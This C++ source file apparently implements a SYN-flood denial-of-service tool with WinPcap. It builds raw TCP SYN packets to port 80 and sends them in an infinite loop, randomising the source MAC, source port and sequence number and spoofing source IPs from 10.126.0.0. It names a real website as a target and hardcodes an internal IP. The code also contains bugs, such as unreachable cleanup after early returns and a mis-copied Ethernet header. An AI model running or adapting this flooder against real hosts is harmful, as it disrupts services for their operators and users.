#define WIN32

#include <stdio.h>
#include <stdlib.h>
#include "pcap.h"
#include <winsock2.h>
#include <conio.h>
#include <iostream>
#include "packet32.h"
#include "ntddndis.h"
#include <time.h>
#include <string>
#include <vector>

using namespace std;

#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")


/*                       IP报文格式
0            8           16                        32
+------------+------------+-------------------------+
| ver + hlen |  服务类型  |         总长度          |
+------------+------------+----+--------------------+
|           标识位        |flag|   分片偏移(13位)   |
+------------+------------+----+--------------------+
|  生存时间  | 高层协议号 |       首部校验和        |
+------------+------------+-------------------------+
|                   源 IP 地址                      |
+---------------------------------------------------+
|                  目的 IP 地址                     |
+---------------------------------------------------+
*/

struct IP_HEADER
{
	byte versionAndHeader;
	byte serviceType;
	byte totalLen[2];
	byte seqNumber[2];
	byte flagAndFragPart[2];
	byte ttl;
	byte hiProtovolType;
	byte headerCheckSum[2];
	byte srcIpAddr[4];
	byte dstIpAddr[4];
};

/*
TCP 报文
0                       16                       32
+------------------------+-------------------------+
|      源端口地址        |      目的端口地址       |
+------------------------+-------------------------+
|                      序列号                      |
+--------------------------------------------------+
|                      确认号                      |
+------+--------+--------+-------------------------+
|HLEN/4| 保留位 |控制位/6|         窗口尺寸        |
+------+--------+--------+-------------------------+
|         校验和         |         应急指针        |
+------------------------+-------------------------+
*/

struct TCP_HEADER
{
	byte srcPort[2];
	byte dstPort[2];
	byte seqNumber[4];
	byte ackNumber[4];
	byte headLen;
	byte contrl;
	byte wndSize[2];
	byte checkSum[2];
	byte uragentPtr[2];
};

struct PSDTCP_HEADER
{
	byte srcIpAddr[4];     //Source IP address; 32 bits
	byte dstIpAddr[4];     //Destination IP address; 32 bits 
	byte padding;          //padding
	byte protocol;         //Protocol; 8 bits
	byte tcpLen[2];        //TCP length; 16 bits
};

struct ETHERNET_HEADER
{
	byte dstMacAddr[6];
	byte srcMacAddr[6];
	byte ethernetType[2];
};

struct DEVS_INFO
{
	char szDevName[512];
	char szDevsDescription[512];
};

int GetAllDevs(DEVS_INFO devsList[])
{
	int nDevsNum = 0;
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		return -1;
		printf("error in pcap_findalldevs_ex: %s\n", errbuf);
	}
	for (pcap_if_t *d = alldevs; d != NULL; d = d->next)
	{
		strcpy(devsList[nDevsNum].szDevName, d->name);
		strcpy(devsList[nDevsNum].szDevsDescription, d->description);
		nDevsNum++;
	}
	pcap_freealldevs(alldevs);

	return nDevsNum;
}

int GetAdapterMacAddr(char *lpszAdapterName, unsigned char ucMacAddr[])
{
	LPADAPTER lpAdapter = PacketOpenAdapter(lpszAdapterName);
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		return -1;
	}

	PPACKET_OID_DATA oidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (NULL == oidData)
	{
		PacketCloseAdapter(lpAdapter);
		return -1;
	}

	oidData->Oid = OID_802_3_CURRENT_ADDRESS;
	oidData->Length = 6;
	memset(oidData->Data, 0, 6);

	BOOLEAN  bStatus = PacketRequest(lpAdapter, FALSE, oidData);
	if (bStatus)
	{
		for (int i = 0; i < 6; ++i)
		{
			ucMacAddr[i] = (oidData->Data)[i];
		}
	}
	else
	{
		return -1;
		free(oidData);
	}
	free(oidData);
	PacketCloseAdapter(lpAdapter);
	return 0;
}


int GetIpByHost(const char *lpszHost, std::vector<std::string> &ipList)
{
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	hostent *phost = gethostbyname(lpszHost);
	in_addr addr;
	char *p = phost->h_addr_list[0];
	for (int i = 1; NULL != p; i++)
	{
		memcpy(&addr.S_un.S_addr, p, phost->h_length);
		ipList.push_back(inet_ntoa(addr));
		p = phost->h_addr_list[i];
	}
	return 0;
}

int GetGatewayMacAddr(byte macAddr[])
{
	byte mac[] = { 0x00, 0x00, 0x5e, 0x00, 0x01, 0x48 };
	//00-00-5e-00-01-48
	memcpy(macAddr, mac, 6);
	return 0;
}


unsigned short CheckSum(unsigned short packet[], int size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *packet++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)packet;
	}
	cksum = (cksum >> 16) + (cksum & 0xFFFF);
	cksum += (cksum >> 16);

	return (USHORT)(~cksum);
}

int EncodeSynPacket(byte packet[], const char *lpszSrcIpAddr, const char *lpszDstIpAddr, byte srcMacAddr[])
{
	TCP_HEADER tcpHeader;
	memset(&tcpHeader, 0, sizeof tcpHeader);
	*(unsigned short *)tcpHeader.srcPort = htons(9999);
	*(unsigned short *)tcpHeader.dstPort = htons(80);
	*(unsigned int *)tcpHeader.seqNumber = htonl(0xFFFF);
	*(unsigned int *)tcpHeader.ackNumber = htonl(0x00);
	tcpHeader.headLen = 5 << 4;
	tcpHeader.contrl = 1 << 1;
	*(unsigned short *)tcpHeader.wndSize = htons(0xFFFF);

	IP_HEADER ipHeader;
	memset(&ipHeader, 0, sizeof ipHeader);
	unsigned char versionAndLen = 0x04;
	versionAndLen <<= 4;
	versionAndLen |= sizeof ipHeader / 4; //版本 + 头长度

	ipHeader.versionAndHeader = versionAndLen;
	*(unsigned short *)ipHeader.totalLen = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));

	ipHeader.ttl = 0xFF;
	ipHeader.hiProtovolType = 0x06;

	*(unsigned int *)(ipHeader.srcIpAddr) = inet_addr(lpszSrcIpAddr);
	*(unsigned int *)(ipHeader.dstIpAddr) = inet_addr(lpszDstIpAddr);
	//*(unsigned short *)(ipHeader.headerCheckSum) = CheckSum( (unsigned short *)&ipHeader, sizeof ipHeader );

	byte gatewayMac[] = { 0x00, 0x00, 0x5e, 0x00, 0x01, 0x48 };

	ETHERNET_HEADER ethHeader;
	memset(&ethHeader, 0, sizeof ethHeader);
	memcpy(ethHeader.dstMacAddr, gatewayMac, 6);
	memcpy(ethHeader.srcMacAddr, srcMacAddr, 6);
	*(unsigned short *)ethHeader.ethernetType = htons(0x0800);

	//memset(packet, 0, sizeof packet);
	memcpy(packet, &tcpHeader, sizeof ethHeader);
	memcpy(packet + sizeof ethHeader, &ipHeader, sizeof ipHeader);
	memcpy(packet + sizeof ethHeader + sizeof ipHeader, &tcpHeader, sizeof tcpHeader);

	return (sizeof ethHeader + sizeof ipHeader + sizeof tcpHeader);
}

int main()
{
	system("mode con cols=110 lines=20");

	DEVS_INFO devsList[64];
	int nDevsNum = GetAllDevs(devsList);
	if (nDevsNum < 1)
	{
		printf("Get adapter infomation failed!");
		exit(0);
	}

	for (int i = 0; i < nDevsNum; ++i)
	{
		printf("%d  %s\t%s\n", i + 1, devsList[i].szDevName, devsList[i].szDevsDescription);
	}
	printf("Input your select adapter index: ");
	int selIndex = 0;
	scanf("%d", &selIndex);
	if (selIndex < 0 || selIndex > nDevsNum + 1)
	{
		printf("Out of range!\nPress any key to exit...");
		_getch();
		return 0;
	}

	char szError[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(devsList[selIndex - 1].szDevName, 65536, 1, 1000, szError);
	if (NULL == handle)
	{
		printf("Open adapter failed!\nPress any key to exit...");
		_getch();
		return 0;
	}

	byte localMacAddr[6];
	memset(localMacAddr, 0, sizeof localMacAddr);
	if (0 != GetAdapterMacAddr(devsList[selIndex - 1].szDevName, localMacAddr))
	{
		printf("Get localhost mac addr failed!\nPress any key to exit...");
		_getch();
		return 0;
	}

	std::vector<std::string> ipList;
	GetIpByHost("www.szbike.com", ipList);

	byte packet[1024];
	//int size = EncodeSynPacket(packet, "0.0.0.0", ipList[0].c_str(), localMacAddr);
	int size = EncodeSynPacket(packet, "0.0.0.0", "10.209.0.102", localMacAddr);
	//return 0;
	ETHERNET_HEADER *pEtherentHeader = (ETHERNET_HEADER *)packet;
	IP_HEADER *pIpHeader = (IP_HEADER *)(packet + sizeof(ETHERNET_HEADER));
	TCP_HEADER *pTcpHeader = (TCP_HEADER *)(packet + sizeof(ETHERNET_HEADER) + sizeof(IP_HEADER));

	//*srand(time(0));
	unsigned short srcPort = 0;//= rand() %0xFFFFFFFF;
	unsigned int srcIpAddr = 0;
	unsigned int baseIpAddr = ntohl(inet_addr("10.126.0.0"));

	byte psdPacket[128];
	memset(psdPacket, 0x00, sizeof psdPacket);
	PSDTCP_HEADER *psdHeader = (PSDTCP_HEADER *)psdPacket;

	*(unsigned int *)(psdHeader->dstIpAddr) = inet_addr(ipList[0].c_str());
	*(unsigned short *)(psdHeader->tcpLen) = htons(sizeof(TCP_HEADER));
	psdHeader->protocol = 0x06;
	psdHeader->padding = 0x00;

	memcpy(psdPacket + sizeof(PSDTCP_HEADER), pTcpHeader, sizeof(TCP_HEADER));

	unsigned int seq = 0;
	srand(time(0));
	while (1)
	{
		for (int i = 0; i < 6; ++i)
		{
			pEtherentHeader->srcMacAddr[i] = (byte)(rand() % (0xFF + 1));
		}

		seq = rand() % 0xFFFFFF;
		srcPort = rand() % 0xFFFF;
		srcIpAddr = baseIpAddr + rand() % 0xFFFF;

		*(unsigned int *)(pIpHeader->srcIpAddr) = htonl(srcIpAddr);
		*(unsigned short *)(pIpHeader->headerCheckSum) = 0x0000;
		*(unsigned short *)(pIpHeader->headerCheckSum) = CheckSum((unsigned short *)pIpHeader, sizeof(IP_HEADER));

		*(unsigned int *)(psdHeader->srcIpAddr) = htonl(srcIpAddr);
		*(unsigned int *)(psdHeader->srcIpAddr) = htonl(srcIpAddr);

		TCP_HEADER *psdTcpHeader = (TCP_HEADER *)(psdPacket + sizeof(PSDTCP_HEADER));

		*(unsigned int *)(psdTcpHeader->seqNumber) = htonl(seq);
		*(unsigned int *)(pTcpHeader->seqNumber) = htonl(seq);//htonl(rand() % 0xFFFFFF );

		*(unsigned short *)(pTcpHeader->srcPort) = htons(srcPort);
		*(unsigned short *)(psdTcpHeader->srcPort) = htons(srcPort);

		*(unsigned short *)(pTcpHeader->checkSum) = 0x0000;
		*(unsigned short *)(pTcpHeader->checkSum) = CheckSum((unsigned short *)psdPacket, sizeof(PSDTCP_HEADER) + sizeof(TCP_HEADER));

		//system("pause");
		Sleep(0);
		pcap_sendpacket(handle, packet, size);
	}

	if (NULL == handle)
	{
		printf("\nUnable to open the adapter. %s is not supported by WinPcap\n");
		return 0;
	}
	pcap_close(handle);
	return 0;
}
